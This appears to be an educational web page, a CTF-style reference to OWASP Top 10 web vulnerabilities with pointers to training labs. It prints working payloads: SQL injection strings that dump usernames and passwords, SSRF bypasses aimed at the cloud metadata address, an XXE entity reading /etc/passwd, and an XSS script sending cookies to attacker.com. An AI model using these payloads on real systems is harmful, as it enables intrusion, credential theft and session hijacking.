---
layout: page
title: Web Vulnerability Reference
subtitle: OWASP Top 10, PortSwigger Academy, and advanced web exploitation guides
permalink: /ctf/web-vulnerabilities/
---

<p class="page-lead">A comprehensive reference guide for modern web application vulnerabilities. Each category features theory, technical exploitation steps, and mappings to PortSwigger Academy labs.</p>

---

## 🛡️ OWASP Top 10 Reference & Attack Guides

### 1. SQL Injection (SQLi)
* **Description**: Happens when user-supplied input is directly concatenated into SQL queries, allowing an attacker to manipulate query logic.
* **Impact**: Database leak, credential access, administrative bypass, and sometimes Remote Code Execution (RCE) via database features (e.g. `xp_cmdshell` or UDF).
* **Common Payloads**:
  * Authentication Bypass: `' OR 1=1 --`
  * UNION-based enumeration: `' UNION SELECT username, password FROM users --`
  * Blind Time-based: `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))A) --`

---

### 2. Server-Side Request Forgery (SSRF)
* **Description**: Allows an attacker to coerce the server-side application to make arbitrary HTTP/TCP requests to internal-only resources.
* **Impact**: Internal network scanning, cloud metadata theft (e.g. AWS IMDSv1 at `169.254.169.254`), and interaction with local services (e.g. Redis, memcached).
* **Common Bypasses**:
  * Decimal IP notation: `http://2852039166/` (resolves to `169.254.169.254`)
  * DNS Rebinding: Using services like `rbndr.us` to flip resolve addresses between public/private IPs.
  * Short URLs or redirects hosted on external domains.

---

### 3. XML External Entity (XXE) Injection
* **Description**: Occurs when XML input containing a reference to an external entity is parsed by a weakly configured XML parser.
* **Impact**: Local File Inclusion (LFI), SSRF, and Denial of Service (DoS).
* **Exploitation Example**:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <user><username>&xxe;</username><password>pass</password></user>
  ```

---

### 4. Cross-Site Scripting (XSS)
* **Description**: Injected malicious scripts execute in the victim's browser context.
  * **Stored XSS**: Payload is persisted in the database (e.g. comment section).
  * **Reflected XSS**: Payload is reflected instantly off the URL parameter.
  * **DOM-based XSS**: Vulnerability lies in client-side Javascript handling source data unsafely.
* **Impact**: Session hijacking (cookie theft), redirecting users, and UI defacement.
* **Cookie Stealer Payload**:
  ```html
  <script>fetch("http://attacker.com/?c=" + document.cookie)</script>
  ```

---

### 5. Insecure Deserialization
* **Description**: Arises when user-controlled serialized objects are parsed back into memory by the server, allowing custom object instantiation that leads to code execution.
* **Impact**: Full system compromise (Remote Code Execution).
* **PHP POP Chain Example**:
  An attacker instantiates a class containing a `__destruct()` magic method that performs file deletion or code execution using member variables they control.

---

## 🎓 Recommended Learning Paths
To master these vulnerabilities, we highly recommend following these pathways:
1. **PortSwigger Web Security Academy**: Complete labs under SQLi, CSRF, SSRF, XSS, XXE, CORS, Access Control, and HTTP Request Smuggling.
2. **PentesterLab**: Work through the *Essential*, *Serialize*, and *OAuth* badges.
3. **OWASP Top 10 THM Room**: Hands-on practice with the fundamental web vulnerability mechanisms.
